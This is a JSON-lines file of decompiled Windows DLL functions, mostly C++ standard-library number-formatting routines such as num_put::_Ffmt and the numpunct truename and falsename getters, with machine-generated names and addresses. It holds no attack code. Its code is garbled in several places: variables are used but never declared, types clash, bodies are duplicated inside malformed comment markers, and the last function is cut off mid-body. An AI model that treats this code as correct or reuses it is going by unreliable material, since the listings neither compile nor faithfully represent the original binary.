{"Function Name": "FUN_100028b4", "Address": "100028b4", "Source Code": "void FUN_100028b4(void)\n{\n    uint modifiedStatusFlag; \n    void *currentObject; \n    uint statusFlag; \n    int *contextPointer; \n    *(undefined4 *)(unaff_EBP + -4) = 1; \n    currentObject = (void *)(*(int *)(*contextPointer + 4) + (int)contextPointer); \n    statusFlag = *(uint *)((int)currentObject + 0xc) | unaff_EDI; \n    modifiedStatusFlag = statusFlag | 4; \n    \n    \n    if (*(int *)((int)currentObject + 0x38) != 0) {\n        modifiedStatusFlag = statusFlag; \n    }\n    \n    FUN_10002180(currentObject, modifiedStatusFlag, '\\0'); \n    \n    *(undefined4 *)(unaff_EBP + -4) = 7; \n    \n    \n    if (!___uncaught_exception()) {\n        FUN_100042a0(contextPointer); \n    }\n    \n    *(undefined *)(unaff_EBP + -4) = 8; \n    \n    \n    int *functionPointer = *(int **)(*(int *)(*contextPointer + 4) + 0x38 + (int)contextPointer);\n    \n    \n    if (functionPointer != (int *)0x0) {\n        (**(code **)(*functionPointer + 8))(); \n    }\n    \n    restoredExceptionList = *(void **)(unaff_EBP + -0xc); \n    return; \n}"}
{"Function Name": "FUN_10002a20", "Address": "10002a20", "Source Code": "void __thiscall\nFUN_10002a20(void *this, undefined4 *param_1, undefined4 param_2, int *param_3, int param_4, byte param_5)\n{\n    char local_50[68]; \n    uint local_c = DAT_1004e008 ^ (uint)&local_50; \n    int *piVar1 = (int *)FUN_100015c0(local_50, 0x40, \"%p\"); \n    FUN_100035d0(this, param_1, param_2, param_3, param_4, param_5, local_50, piVar1); \n    ___security_check_cookie_4(local_c ^ (uint)&local_50); \n    return; \n}"}
{"Function Name": "FUN_10002a90", "Address": "10002a90", "Source Code": "void __thiscall\nFUN_10002a90(char *param_1, undefined4 *param_2, undefined4 param_3, int *param_4, int param_5,\nbyte param_6, double param_7)\n{\n    code *pcVar1; \n    uint uVar2; \n    char *pcVar3; \n    int *piVar4; \n    undefined4 ****ppppuVar5; \n    uint uVar6; \n    uint local_24; \n    uint local_20; \n    uint local_38; \n    undefined4 ****local_34[4]; \n    local_24 = 0; \n    local_20 = 0xf; \n    local_34[0] = (undefined4 ****)((uint)local_34[0] & 0xffffff00); \n    local_38 = *(uint *)(param_5 + 0x1c); \n    uVar2 = *(uint *)(param_5 + 0x14) & 0x3000; \n    uVar6 = *(uint *)(param_5 + 0x18); \n    \n    \n    if (((int)local_38 < 1) && ((((int)local_38 < 0 || (uVar6 == 0)) && (uVar2 != 0x2000)))) {\n        uVar6 = 6; \n        local_38 = 0; \n    }\n    \n    \n    if ((uVar2 == 0x2000) && (_DAT_10048760 < (double)CONCAT44((uint)((ulonglong)param_7 >> 0x20) & _UNK_10048884, SUB84(param_7, 0) & _DAT_10048880))) {\n        FUN_1001db7c(param_7, (int *)&local_38); \n        uVar6 = (int)(((local_38 ^ (int)local_38 >> 0x1f) - ((int)local_38 >> 0x1f)) * 0x7597) / 100000 + uVar6; \n    }\n    \n    FUN_10002510(local_34, -(uint)(0xffffffcd < uVar6) | uVar6 + 0x32, '\\0'); \n    pcVar3 = std::num_put<char, class_std::ostreambuf_iterator<char, struct_std::char_traits<char>_>>::_Ffmt(nullptr, param_1, 0x4c); \n    ppppuVar5 = (local_20 > 0xf) ? local_34[0] : local_34; \n    piVar4 = (int *)FUN_100015c0((char *)ppppuVar5, local_24, pcVar3); \n    FUN_10003aa0(param_1, param_2, param_3, param_4, param_5, param_6, (char *)ppppuVar5, piVar4); \n    \n    if (local_20 > 0xf) {\n        \n        if (0xfff < local_20 + 1) {\n            ppppuVar5 = (undefined4 ****)local_34[0][-1]; \n            \n            if ((char *)0x1f < (char *)((int)local_34[0] + (-4 - (int)ppppuVar5))) {\n                FUN_1001dea6(); \n                pcVar1 = (code *)swi(3); \n                (*pcVar1)(); \n                return; \n            }\n        }\n        FUN_10013ceb(ppppuVar5); \n    }\n    \n    return; \n}"}
{"Function Name": "FUN_10002c30", "Address": "10002c30", "Source Code": "void __thiscall\nFUN_10002c30(char *param_1, undefined4 *param_2, undefined4 param_3, int *param_4, int param_5,\nbyte param_6, double param_7)\n{\n    code *pcVar1; \n    uint uVar2; \n    char *pcVar3; \n    int *piVar4; \n    undefined4 ****ppppuVar5; \n    uint uVar6; \n    uint local_24 = 0; \n    uint local_20 = 0xf; \n    uint local_38 = *(uint *)(param_5 + 0x1c); \n    uVar2 = *(uint *)(param_5 + 0x14) & 0x3000; \n    uint uVar6 = *(uint *)(param_5 + 0x18); \n    \n    \n    if (((int)local_38 < 1) && ((((int)local_38 < 0 || (uVar6 == 0)) && (uVar2 != 0x2000)))) {\n        uVar6 = 6; \n        local_38 = 0; \n    }\n    \n    \n    if ((uVar2 == 0x2000) && (_DAT_10048760 < (double)CONCAT44((uint)((ulonglong)param_7 >> 0x20) & _UNK_10048884, SUB84(param_7, 0) & _DAT_10048880))) {\n        FUN_1001db7c(param_7, (int *)&local_38); \n        \n        uVar6 = (int)(((local_38 ^ (int)local_38 >> 0x1f) - ((int)local_38 >> 0x1f)) * 0x7597) / 100000 + uVar6;\n    }\n    \n    \n    FUN_10002510(local_34, -(uint)(0xffffffcd < uVar6) | uVar6 + 0x32, '\\0');\n    pcVar3 = std::num_put<char, class_std::ostreambuf_iterator<char, struct_std::char_traits<char>_>>::_Ffmt(this, param_1, 0, 0); \n    ppppuVar5 = (local_20 > 0xf) ? local_34[0] : local_34; \n    piVar4 = (int *)FUN_100015c0((char *)ppppuVar5, local_24, pcVar3); \n    \n    \n    FUN_10003aa0(param_1, param_2, param_3, param_4, param_5, param_6, (char *)ppppuVar5, piVar4);\n    \n    \n    if (local_20 > 0xf) {\n        \n        if (0xfff < local_20 + 1) {\n            ppppuVar5 = (undefined4 ****)local_34[0][-1]; \n            \n            if ((char *)0x1f < (char *)((int)local_34[0] + (-4 - (int)ppppuVar5))) {\n                FUN_1001dea6(); \n                pcVar1 = (code *)swi(3); \n                (*pcVar1)(); \n                return; \n            }\n        }\n        FUN_10013ceb(ppppuVar5); \n    }\n    \n    return; \n}"}
{"Function Name": "FUN_10002dd0", "Address": "10002dd0", "Source Code": "void __thiscall\nFUN_10002dd0(void *this, undefined4 *param_1, undefined4 param_2, int *param_3, int param_4, byte param_5)\n{\n    char *pcVar1; \n    int *piVar2; \n    undefined auStack_5c[4]; \n    char local_50[68]; \n    uint local_c = DAT_1004e008 ^ (uint)auStack_5c; \n    \n    pcVar1 = FUN_10003a10(this, NULL, \"Lu\", *(uint *)(param_4 + 0x14));\n    \n    \n    piVar2 = (int *)FUN_100015c0(local_50, 0x40, pcVar1);\n    \n    \n    FUN_100035d0(this, param_1, param_2, param_3, param_4, param_5, local_50, piVar2);\n    \n    \n    ___security_check_cookie_4(local_c ^ (uint)auStack_5c);\n    \n    return; \n}"}
{"Function Name": "FUN_10002e50", "Address": "10002e50", "Source Code": "void __thiscall\nFUN_10002e50(void *this, undefined4 *param_1, undefined4 param_2, int *param_3, int param_4, byte param_5)\n{\n    char *pcVar1; \n    int *piVar2; \n    undefined auStack_5c[4]; \n    char local_50[68]; \n    \n    pcVar1 = FUN_10003a10(this, auStack_5c, \"Ld\", *(uint *)(param_4 + 0x14));\n    \n    \n    piVar2 = (int *)FUN_100015c0(local_50, 0x40, pcVar1);\n    \n    \n    FUN_100035d0(this, param_1, param_2, param_3, param_4, param_5, local_50, piVar2);\n    \n    \n    ___security_check_cookie_4(DAT_1004e008 ^ (uint)auStack_5c);\n    \n    return; \n}"}
{"Function Name": "FUN_10002ed0", "Address": "10002ed0", "Source Code": "void __thiscall\nFUN_10002ed0(void *this, undefined4 *param_1, undefined4 param_2, int *param_3, int param_4, byte param_5)\n{\n    char *pcVar1; \n    int *piVar2; \n    undefined auStack_5c[4]; \n    char local_50[68]; \n    uint local_c = DAT_1004e008 ^ (uint)auStack_5c; \n    pcVar1 = FUN_10003a10(this, NULL, \"lu\", *(uint *)(param_4 + 0x14)); \n    piVar2 = (int *)FUN_100015c0(local_50, 0x40, pcVar1); \n    FUN_100035d0(this, param_1, param_2, param_3, param_4, param_5, local_50, piVar2); \n    ___security_check_cookie_4(local_c ^ (uint)auStack_5c); \n    return; \n}"}
{"Function Name": "FUN_10002f50", "Address": "10002f50", "Source Code": "void __thiscall\nFUN_10002f50(void *this, undefined4 *param_1, undefined4 param_2, int *param_3, int param_4, byte param_5)\n{\n    char *pcVar1; \n    int *piVar2; \n    undefined auStack_5c[4]; \n    char local_50[68]; \n    uint local_c = DAT_1004e008 ^ (uint)auStack_5c; \n    pcVar1 = FUN_10003a10(this, NULL, \"ld\", *(uint *)(param_4 + 0x14)); \n    piVar2 = (int *)FUN_100015c0(local_50, 0x40, pcVar1); \n    FUN_100035d0(this, param_1, param_2, param_3, param_4, param_5, local_50, piVar2); \n    ___security_check_cookie_4(local_c ^ (uint)auStack_5c); \n    return; \n}"}
{"Function Name": "FUN_10002fd0", "Address": "10002fd0", "Source Code": "void __thiscall\nFUN_10002fd0(void *this, undefined4 *param_1, undefined4 param_2, int *param_3, int param_4,\nundefined param_5, char param_6)\n{\n    uint uVar1; \n    undefined4 uVar2; \n    code *pcVar3; \n    uint uVar4; \n    int *piVar5; \n    undefined4 *puVar6; \n    void *pvVar8; \n    int iVar9; \n    undefined4 local_60[2]; \n    void *local_58[5]; \n    uint local_44; \n    undefined4 local_40; \n    int *local_3c; \n    undefined4 local_38; \n    void *local_34; \n    undefined4 local_30; \n    uint local_1c; \n    uint local_18; \n    uint local_14; \n    void *local_10; \n    undefined *puStack_c; \n    local_10 = ExceptionList; \n    local_14 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &local_10; \n    local_38 = param_1; \n    local_30 = CONCAT31(local_30._1_3_, param_5); \n    local_34 = this; \n    \n    if ((*(uint *)(param_4 + 0x14) & 0x4000) == 0) {\n        \n        (**(code **)(*this + 0x24))(param_1, param_2, param_3, param_4, local_30, param_6);\n    } else {\n        \n        local_3c = *(int **)(*(int *)(param_4 + 0x30) + 4);\n        \n        (**(code **)(*local_3c + 4))(local_14);\n        \n        piVar5 = (int *)FUN_10004b90((undefined (*) [16])&local_40);\n        \n        \n        if ((local_3c != (int *)0x0) && (puVar6 = (undefined4 *)(**(code **)(*local_3c + 8))(), puVar6 != (undefined4 *)0x0)) {\n            (**(code **)*puVar6)(1); \n        }\n        \n        local_1c = 0; \n        local_18 = 0xf; \n        \n        if (param_6 == '\\0') {\n            \n            (**(code **)(*piVar5 + 0x18))(local_58);\n        } else {\n            \n            (**(code **)(*piVar5 + 0x1c))();\n        }\n        \n        \n        FUN_10004150(local_58);\n        \n        if (0xf < local_44) {\n            pvVar8 = local_58[0]; \n            \n            if ((0xfff < local_44 + 1) && (pvVar8 = *(void **)((int)local_58[0] + -4), 0x1f < (uint)((int)local_58[0] + (-4 - (int)pvVar8)))) {\n                FUN_1001dea6(); \n                pcVar3 = (code *)swi(3); \n                (*pcVar3)(); \n                return; \n            }\n            FUN_10013ceb(pvVar8); \n        }\n        \n        uVar4 = local_1c; \n        uVar1 = *(uint *)(param_4 + 0x20); \n        \n        if ((*(int *)(param_4 + 0x24) < 0) || ((*(int *)(param_4 + 0x24) < 1 && (uVar1 == 0)) || (uVar1 <= local_1c))) {\n            iVar9 = 0; \n        } else {\n            iVar9 = uVar1 - local_1c; \n        }\n        \n        \n        if ((*(uint *)(param_4 + 0x14) & 0x1c0) != 0x40) {\n            \n            puVar6 = (undefined4 *)FUN_100034c0(local_34, &local_40, param_2, param_3, (byte)local_30, iVar9);\n            param_2 = *puVar6; \n            param_3 = (int *)puVar6[1]; \n        }\n        \n        \n        puVar6 = (undefined4 *)FUN_10003540(local_34, local_60, param_2, param_3, (byte *)local_58, uVar4);\n        uVar2 = *puVar6; \n        piVar5 = (int *)puVar6[1]; \n        *(undefined4 *)(param_4 + 0x20) = 0; \n        *(undefined4 *)(param_4 + 0x24) = 0; \n        \n        FUN_100034c0(local_34, local_38, uVar2, piVar5, (byte)local_30, iVar9);\n        \n        \n        if (0xf < local_18) {\n            \n            if ((0xfff < local_18 + 1) && ((undefined4 ****)local_58[-1], (byte *)0x1f < (byte *)((int)local_58 + (-4 - (int)ppppuVar7)))) {\n                FUN_1001dea6(); \n                pcVar3 = (code *)swi(3); \n                (*pcVar3)(); \n                return; \n            }\n            FUN_10013ceb(local_58); \n        }\n    }\n    ExceptionList = local_10; \n    ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_100031f0", "Address": "100031f0", "Source Code": "int ** __thiscall FUN_100031f0(void *this, int *inputParam, char charParam)\n{\n    \n    int *intPointer = *(int **)((int)this + 0x14);\n    void *currentObjectPointer = this; \n    \n    if (inputParam <= intPointer) {\n        \n        if ((int *)0xf < intPointer) {\n            currentObjectPointer = *this; \n        }\n        *(int **)((int)this + 0x10) = inputParam; \n        _memset(currentObjectPointer, (int)charParam, (size_t)inputParam); \n        *(undefined *)((int)inputParam + (int)currentObjectPointer) = 0; \n        return (int **)this; \n    }\n    \n    if ((int *)0x7fffffff < inputParam) goto LAB_10003323; \n    uint alignedInputParam = (uint)inputParam | 0xf; \n    uint calculatedSize;\n    \n    if (alignedInputParam < 0x80000000) {\n        \n        if ((int *)(0x7fffffff - ((uint)intPointer >> 1)) < intPointer) {\n            alignedInputParam = 0x7fffffff; \n        } else {\n            calculatedSize = ((uint)intPointer >> 1) + (int)intPointer; \n            if (alignedInputParam < calculatedSize) {\n                alignedInputParam = calculatedSize; \n            }\n        }\n    } else {\n        alignedInputParam = 0x7fffffff; \n    }\n    calculatedSize = -(uint)(0xfffffffe < alignedInputParam) | alignedInputParam + 1; \n    \n    if (calculatedSize < 0x1000) {\n        currentObjectPointer = (calculatedSize == 0) ? (void *)0x0 : (void *)FUN_10013cf9(calculatedSize); \n        *(int **)((int)this + 0x10) = inputParam; \n        *(uint *)((int)this + 0x14) = alignedInputParam; \n        _memset(currentObjectPointer, (int)charParam, (size_t)inputParam); \n        *(undefined *)((int)inputParam + (int)currentObjectPointer) = 0; \n        \n        if (intPointer < (int *)0x10) {\n            *(void **)this = currentObjectPointer; \n            return (int **)this; \n        }\n        void *previousObjectPointer = *this; \n        \n        if (((int)intPointer + 1U < 0x1000) || ((uint)((int)previousObjectPointer + (-4 - (int)*(void **)((int)previousObjectPointer - 4))) < 0x20)) {\n            FUN_10013ceb(*(void **)((int)previousObjectPointer - 4)); \n            goto LAB_10003311; \n        }\n    } else {\n        uint adjustedSize = calculatedSize + 0x23; \n        if (adjustedSize <= calculatedSize) {\n            adjustedSize = 0xffffffff; \n        }\n        int allocatedMemorySize = FUN_10013cf9(adjustedSize); \n        if (allocatedMemorySize != 0) {\n            currentObjectPointer = (void *)(allocatedMemorySize + 0x23U & 0xffffffe0); \n            *(int *)((int)currentObjectPointer - 4) = allocatedMemorySize; \n            goto LAB_100032c1; \n        }\n    }\n    FUN_1001dea6(); \nLAB_10003323:\n    FUN_10005260(); \n    return (int **)(*(code *)swi(3))(); \n}"}
{"Function Name": "FUN_10003360", "Address": "10003360", "Source Code": "\\*\nReturnType * method FUN_10003360(void *object, ByteType flag)\n{\n    \n    *(undefined ***)object = std::_Facet_base::vftable;\n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nReturnType * method FUN_10003360(void *object, ByteType flag)\n{\n    *(undefined ***)object = std::_Facet_base::vftable;\n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "std::numpunct<char>::do_truename", "Address": "10003390", "Source Code": "\\*\nundefined * __thiscall std::numpunct<char>::do_truename(numpunct<char> *this, undefined *outputBuffer)\n{\n    \n    undefined8 *truenamePtr = *(undefined8 **)(this + 0x14);\n    \n    \n    *(undefined4 *)(outputBuffer + 0x10) = 0;\n    \n    \n    *(undefined4 *)(outputBuffer + 0x14) = 0xf;\n    \n    \n    *outputBuffer = 0;\n    \n    undefined8 *currentCharPtr = truenamePtr;\n    \n    \n    while (*(char *)currentCharPtr != '\\0') {\n        \n        currentCharPtr = (undefined8 *)((int)currentCharPtr + 1);\n    }\n    \n    \n    FUN_10004010(outputBuffer, truenamePtr, (void *)((int)currentCharPtr - ((int)truenamePtr + 1)));\n    \n    \n    return outputBuffer;\n}\n*\\ \n \nundefined * __thiscall std::numpunct<char>::do_truename(numpunct<char> *this, undefined *outputBuffer)\n{\n    undefined8 *truenamePtr = *(undefined8 **)(this + 0x14);\n    *(undefined4 *)(outputBuffer + 0x10) = 0;\n    *(undefined4 *)(outputBuffer + 0x14) = 0xf;\n    *outputBuffer = 0;\n    undefined8 *currentCharPtr = truenamePtr;\n    while (*(char *)currentCharPtr != '\\0') {\n        currentCharPtr = (undefined8 *)((int)currentCharPtr + 1);\n    }\n    \n    FUN_10004010(outputBuffer, truenamePtr, (void *)((int)currentCharPtr - ((int)truenamePtr + 1)));\n    return outputBuffer;\n}"}
{"Function Name": "std::numpunct<char>::do_falsename", "Address": "100033d0", "Source Code": "\\*\nundefined * __thiscall std::numpunct<char>::do_falsename(numpunct<char> *this, undefined *outputStructure)\n{\n    \n    undefined8 *stringPointer = *(undefined8 **)(this + 0x10);\n    \n    \n    *(undefined4 *)(outputStructure + 0x10) = 0;\n    \n    \n    *(undefined4 *)(outputStructure + 0x14) = 0xf;\n    \n    \n    *outputStructure = 0;\n    \n    undefined8 *traversePointer = stringPointer;\n    \n    \n    while (*(char *)traversePointer != '\\0') {\n        \n        traversePointer = (undefined8 *)((int)traversePointer + 1);\n    }\n    \n    \n    FUN_10004010(outputStructure, stringPointer, (void *)((int)traversePointer - ((int)stringPointer + 1)));\n    \n    \n    return outputStructure;\n}\n*\\ \n \nundefined * __thiscall std::numpunct<char>::do_falsename(numpunct<char> *this, undefined *outputStructure)\n{\n    undefined8 *stringPointer = *(undefined8 **)(this + 0x10);\n    *(undefined4 *)(outputStructure + 0x10) = 0;\n    *(undefined4 *)(outputStructure + 0x14) = 0xf;\n    *outputStructure = 0;\n    undefined8 *traversePointer = stringPointer;\n    while (*(char *)traversePointer != '\\0') {\n        traversePointer = (undefined8 *)((int)traversePointer + 1);\n    }\n    \n    FUN_10004010(outputStructure, stringPointer, (void *)((int)traversePointer - ((int)stringPointer + 1)));\n    return outputStructure;\n}"}
{"Function Name": "std::numpunct<char>::do_grouping", "Address": "10003410", "Source Code": "\\*\nundefined * __thiscall std::numpunct<char>::do_grouping(numpunct<char> *this, undefined *groupingParams)\n{\n    \n    undefined8 *groupingDataPtr = *(undefined8 **)(this + 8);\n    \n    \n    *(undefined4 *)(groupingParams + 0x10) = 0;\n    \n    \n    *(undefined4 *)(groupingParams + 0x14) = 0xf;\n    \n    \n    *groupingParams = 0;\n    \n    undefined8 *currentCharPtr = groupingDataPtr;\n    \n    \n    while (*(char *)currentCharPtr != '\\0') {\n        \n        currentCharPtr = (undefined8 *)((int)currentCharPtr + 1);\n    }\n    \n    \n    FUN_10004010(groupingParams, groupingDataPtr, (void *)((int)currentCharPtr - ((int)groupingDataPtr + 1)));\n    \n    \n    return groupingParams;\n}\n*\\ \n \nundefined * __thiscall std::numpunct<char>::do_grouping(numpunct<char> *this, undefined *groupingParams)\n{\n    undefined8 *groupingDataPtr = *(undefined8 **)(this + 8);\n    *(undefined4 *)(groupingParams + 0x10) = 0;\n    *(undefined4 *)(groupingParams + 0x14) = 0xf;\n    *groupingParams = 0;\n    undefined8 *currentCharPtr = groupingDataPtr;\n    while (*(char *)currentCharPtr != '\\0') {\n        currentCharPtr = (undefined8 *)((int)currentCharPtr + 1);\n    }\n    \n    FUN_10004010(groupingParams, groupingDataPtr, (void *)((int)currentCharPtr - ((int)groupingDataPtr + 1)));\n    return groupingParams;\n}"}
{"Function Name": "FUN_10003540", "Address": "10003540", "Source Code": "void __cdecl\nFUN_10003540(undefined4 param_1, undefined4 *param_2, undefined4 param_3, int *param_4, byte *param_5, int param_6)\n{\n    byte bVar1; \n    uint uVar4; \n    \n    if (param_6 != 0) {\n        do {\n            \n            if (param_4 == (int *)0x0) {\n                \n                param_3 = CONCAT31(param_3._1_3_, 1);\n            } else {\n                \n                bVar1 = *param_5;\n                \n                if (*(int *)param_4[8] == 0) {\n                    \n                    uVar4 = (**(code **)(*param_4 + 0xc))(bVar1);\n                } else {\n                    \n                    if (*(int *)param_4[0xc] < 1) {\n                        \n                        uVar4 = (**(code **)(*param_4 + 0xc))(bVar1);\n                    } else {\n                        \n                        *(int *)param_4[0xc] -= 1;\n                        \n                        *(byte **)param_4[8] += 1;\n                        \n                        *(*(byte **)param_4[8] - 1) = bVar1;\n                        \n                        uVar4 = (uint)bVar1;\n                    }\n                }\n                \n                if (uVar4 == 0xffffffff) {\n                    \n                    param_3 = CONCAT31(param_3._1_3_, 1);\n                }\n            }\n            \n            param_5++;\n            \n            param_6--;\n        } while (param_6 != 0); \n    }\n    \n    param_2[1] = param_4; \n    *param_2 = param_3;   \n    return; \n}"}
{"Function Name": "FUN_100035d0", "Address": "100035d0", "Source Code": "void __cdecl\nFUN_100035d0(undefined4 param_1, undefined4 *param_2, undefined4 param_3, int *param_4, int param_5,\nbyte param_6, char *param_7, int *param_8)\n{\n    undefined4 *puVar5; \n    int *piVar6; \n    undefined4 ****ppppuVar8; \n    uint uVar9; \n    int *local_54; \n    int local_58; \n    int *local_4c; \n    undefined local_45; \n    undefined4 ****local_44[4]; \n    undefined4 local_60; \n    uint local_30; \n    int *local_1c; \n    int *local_18; \n    uint local_14; \n    void *local_10; \n    undefined4 local_8; \n    local_10 = ExceptionList; \n    local_14 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &local_10; \n    local_58 = param_5; \n    \n    local_54 = (param_8 == (int *)0x0 || (*param_7 != '+' && *param_7 != '-')) ? (int *)0x0 : (int *)0x1;\n    \n    if ((((*(uint *)(param_5 + 0x14) & 0xe00) == 0x800) && ((int)((int)local_54 + 2U) <= param_8)) &&\n        (param_7[(int)local_54] == '0') &&\n        ((param_7 + 1)[(int)local_54] == 'x' || (param_7 + 1)[(int)local_54] == 'X'))) {\n        local_54 = (int *)((int)local_54 + 2U); \n    }\n    local_8 = 0; \n    local_4c = *(int **)(*(int *)(param_5 + 0x30) + 4); \n    (**(code **)(*local_4c + 4))(local_14); \n    local_8 = 1; \n    local_60 = (int *)FUN_100043b0(&local_50); \n    local_8 = 2; \n    \n    if (local_4c != (int *)0x0 && (puVar5 = (undefined4 *)(**(code **)(*local_4c + 8))(), puVar5 != (undefined4 *)0x0)) {\n        (**(code **)*puVar5)(1); \n    }\n    local_8 = 0xffffffff; \n    local_1c = (int *)0x0; \n    local_18 = (int *)0xf; \n    undefined4 ****local_2c[4]; \n    local_2c[0] = (undefined4 ****)((uint)local_2c[0] & 0xffffff00); \n    FUN_100031f0(local_2c, param_8, '\\0'); \n    local_8 = 3; \n    ppppuVar8 = local_2c; \n    \n    if ((int *)0xf < local_18) {\n        ppppuVar8 = local_2c[0]; \n    }\n    \n    (**(code **)(*local_60 + 0x1c))(param_7, param_7 + (int)param_8, ppppuVar8);\n    local_8._0_1_ = 4; \n    local_4c = *(int **)(*(int *)(local_58 + 0x30) + 4); \n    (**(code **)(*local_4c + 4))(); \n    local_8._0_1_ = 5; \n    piVar6 = (int *)FUN_10004b90((undefined (*) [16])&local_50); \n    local_8._0_1_ = 6; \n    local_60 = piVar6; \n    \n    if (local_4c != (int *)0x0 && (puVar5 = (undefined4 *)(**(code **)(*local_4c + 8))(), puVar5 != (undefined4 *)0x0)) {\n        (**(code **)*puVar5)(1); \n    }\n    local_8._0_1_ = 3; \n    (**(code **)(*piVar6 + 0x14))(local_44); \n    local_8 = CONCAT31(local_8._1_3_, 7); \n    ppppuVar8 = local_44; \n    \n    if (0xf < local_30) {\n        ppppuVar8 = local_44[0]; \n    }\n    char cVar4 = *(char *)ppppuVar8; \n    \n    if (cVar4 != '\\x7f' && '\\0' < cVar4) {\n        \n        if ((undefined **)*local_60 == std::numpunct<char>::vftable) {\n            local_45 = *(undefined *)((int)local_60 + 0xd); \n        } else {\n            local_45 = (*(code *)((undefined **)*local_60)[4])(); \n            cVar4 = *(char *)ppppuVar8; \n        }\n        local_60 = (int *)CONCAT31(local_60._1_3_, local_45); \n        \n        while (cVar4 != '\\x7f' && '\\0' < cVar4 && (uint)(int)cVar4 < (uint)((int)param_8 - (int)local_54)) {\n            param_8 = (int *)((int)param_8 - (int)cVar4); \n            if (local_1c < param_8) {\n                FUN_100043a0(); \n                goto LAB_100039f8; \n            }\n            \n            if (local_18 == local_1c) {\n                local_4c = (int *)((uint)local_4c & 0xffffff00); \n                FUN_10005080(local_2c, 1, local_4c, (uint)param_8, 1, (char)local_60); \n            } else {\n                ppppuVar7 = local_2c; \n                \n                if ((int *)0xf < local_18) {\n                    ppppuVar7 = local_2c[0]; \n                }\n                undefined8 *puVar10 = (undefined8 *)((int)ppppuVar7 + (int)param_8); \n                uint uVar9 = (int)local_1c + (1 - (int)param_8); \n                local_1c = (int *)((int)local_1c + 1); \n                FUN_10018bf0((undefined8 *)((int)puVar10 + 1), puVar10, uVar9); \n                *(undefined *)puVar10 = local_45; \n                piVar11 = local_54; \n            }\n            ppppuVar7 = (undefined4 ****)((int)ppppuVar8 + 1); \n            \n            if (*(char *)((int)ppppuVar8 + 1) < '\\x01') {\n                ppppuVar7 = ppppuVar8; \n            }\n            ppppuVar8 = ppppuVar7; \n            cVar4 = *(char *)ppppuVar7; \n        }\n    }\n    piVar3 = local_1c; \n    piVar6 = *(int **)(local_58 + 0x20); \n    \n    int iVar12 = ((*(int *)(local_58 + 0x24) < 0) || ((*(int *)(local_58 + 0x24) < 1 && (piVar6 == (int *)0x0)))) || (piVar6 <= local_1c)) ? 0 : (int)piVar6 - (int)local_1c;\n    uVar9 = *(uint *)(local_58 + 0x14) & 0x1c0; \n    \n    if (uVar9 == 0x40 || uVar9 == 0x100) {\n        ppppuVar8 = local_2c; \n        if ((int *)0xf < local_18) {\n            ppppuVar8 = local_2c[0]; \n        }\n        puVar5 = (undefined4 *)FUN_10003540(param_1, &local_50, param_3, param_4, (byte *)ppppuVar8, (int)local_54); \n        if (uVar9 == 0x100) {\n            puVar5 = (undefined4 *)FUN_100034c0(param_1, &local_50, *puVar5, (int *)puVar5[1], param_6, iVar12); \n            iVar12 = 0; \n        }\n    } else {\n        puVar5 = (undefined4 *)FUN_100034c0(param_1, &local_50, param_3, param_4, param_6, iVar12); \n        iVar12 = 0; \n        ppppuVar8 = local_2c; \n        if ((int *)0xf < local_18) {\n            ppppuVar8 = local_2c[0]; \n        }\n        puVar5 = (undefined4 *)FUN_10003540(param_1, &local_50, *puVar5, (int *)puVar5[1], (byte *)ppppuVar8, (int)local_54); \n    }\n    ppppuVar8 = local_2c; \n    if ((int *)0xf < local_18) {\n        ppppuVar8 = local_2c[0]; \n    }\n    puVar5 = (undefined4 *)FUN_10003540(param_1, &local_60, *puVar5, (int *)puVar5[1], (byte *)((int)ppppuVar8 + (int)local_54), (int)piVar3 - (int)local_54); \n    undefined4 uVar1 = *puVar5; \n    local_54 = (int *)puVar5[1]; \n    *(undefined4 *)(local_58 + 0x20) = 0; \n    *(undefined4 *)(local_58 + 0x24) = 0; \n    FUN_100034c0(param_1, param_2, uVar1, local_54, param_6, iVar12); \n    \n    if (0xf < local_30) {\n        ppppuVar8 = local_44[0]; \n        if ((0xfff < local_30 + 1) && (ppppuVar8 = (undefined4 ****)local_44[0][-1], (char *)0x1f < (char *)((int)local_44[0] + (-4 - (int)ppppuVar8)))) {\n            LAB_100039f8: \n            FUN_1001dea6(); \n            goto LAB_100039fd; \n        }\n        FUN_10013ceb(ppppuVar8); \n    }\n    local_34 = 0; \n    local_30 = 0xf; \n    local_44[0] = (undefined4 ****)((uint)local_44[0] & 0xffffff00); \n    \n    if ((int *)0xf < local_18) {\n        ppppuVar8 = local_2c[0]; \n        if ((0xfff < (int)local_18 + 1U) && (ppppuVar8 = (undefined4 ****)local_2c[0][-1], (byte *)0x1f < (byte *)((int)local_2c[0] + (-4 - (int)ppppuVar8)))) {\n            LAB_100039fd: \n            FUN_1001dea6(); \n            pcVar2 = (code *)swi(3); \n            (*pcVar2)(); \n            return; \n        }\n        FUN_10013ceb(ppppuVar8); \n    }\n    ExceptionList = local_10; \n    ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "std::num_put<char,class_std::ostreambuf_iterator<char,struct_std::char_traits<char>_>_>::_Ffmt", "Address": "10003f50", "Source Code": "\\*\nchar * __thiscall\nstd::num_put<char,class_std::ostreambuf_iterator<char,struct_std::char_traits<char>_>_>::_Ffmt\n(num_put<char,class_std::ostreambuf_iterator<char,struct_std::char_traits<char>_> *this,\nchar *param_1,char param_2,int param_3)\n{\n    char *puVar1; \n    uint uVar3;   \n    *param_2 = '%'; \n    puVar1 = param_2 + 1; \n    \n    if ((in_stack_00000010 & 0x20) != 0) {\n        *puVar1++ = 0x2b; \n    }\n    \n    if ((in_stack_00000010 & 0x10) != 0) {\n        *puVar1++ = 0x23; \n    }\n    *puVar1++ = 0x2a2e; \n    \n    if ((char)param_3 != '\\0') {\n        *puVar1++ = (char)param_3; \n    }\n    uVar3 = in_stack_00000010 & 0x3000; \n    \n    if ((in_stack_00000010 & 4) == 0) {\n        \n        if (uVar3 == 0x3000) {\n            *puVar1++ = 0x61; \n        } else {\n            *puVar1++ = (uVar3 != 0x1000) * '\\x02' + 'e'; \n        }\n    } else {\n        \n        if (uVar3 == 0x3000) {\n            *puVar1++ = 0x41; \n        } else {\n            *puVar1++ = (uVar3 != 0x1000) * '\\x02' + 'E'; \n        }\n    }\n    *puVar1 = 0; 